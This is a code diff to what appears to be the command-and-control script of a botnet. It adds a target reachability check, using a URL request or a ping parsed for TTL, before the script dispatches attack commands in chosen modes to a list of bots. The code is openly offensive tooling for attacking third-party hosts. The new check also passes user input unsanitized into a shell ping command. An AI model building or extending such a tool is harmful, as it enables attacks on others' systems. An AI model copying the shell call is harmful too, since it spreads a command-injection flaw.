@@ -3,8 +3,9 @@
 # @Author    :D0WE1L1N
 import threading, socket, time, json
 from sys import path
+from urllib import request as req
 from platform import system as system_type
-from os import system, remove, mkdir, _exit
+from os import system, remove, mkdir, _exit, popen
 from os import path as os_path
 from shutil import rmtree, copy
 from random import randint
@@ -203,6 +204,28 @@ def post_cmd():
                     if input(f'Already attacking {target}, Do you want do attack it twice at a time?(y/n): >>> ') != 'y':
                         continue
                 mode = command.split('_')[1]
+                print_normal('Checking if this target is avaliable......')
+                try: # Test target : in url or ip mode
+                    try:
+                        response = req.urlopen(url=target)# case url
+                    except req.HTTPError as e:
+                        print_warn(f"Something wrong when doing a GET request : {e}")
+                        print_normal("But it seems like the url is avaliable, attack can be issued")
+                    except:
+                        Ping_re = popen('ping %s' % target)# case ip
+                        result = Ping_re.read() 
+                        Ping_re.close()
+                        if 'TTL' not in result:
+                            raise Exception('IP input error')
+                        else:
+                            TTL_location = result.find("TTL")
+                            print_good(f'Target avaliable, type : ip, TTL : {result[TTL_location+4] + result[TTL_location+5] + result[TTL_location+6]}')
+                    else:
+                        print_good(f'Target avaliable, type : url, response code : {response.status}')
+                except Exception as e:
+                    print(e)
+                    print_error(f'Target error, unavaliable target : {target}')
+                    continue
                 if mode in mode_list:
                     ok = input(f'Are you sure to attack {target} using {mode}?(y,n) >>> ')
                     if ok == 'y' or ok == 'Y' or ok == 'yes' or ok == 'YES' or ok == '':
@@ -210,7 +233,7 @@ def post_cmd():
                         if send(command, attack_bots) != False:
                             History_write( f'Start to attack {target} with {mode}, using {attack_bots}', 'A')
                     else:
-                        print_normal('All attack canceled')
+                        print_normal('Attack canceled')
                 else:
                     print_error(f'Unknown attack method {mode}, print out the mode list {mode_list}')
             except:
@@ -484,7 +507,7 @@ def check_data_in_settings(settings_dict):
 
 if __name__ == '__main__':
     '''Program entry'''
-    version = 'v0.1.6.2'
+    version = 'v0.1.6.3'
     print('\033[0;35m' + fr"""
 
 ===========================================================================
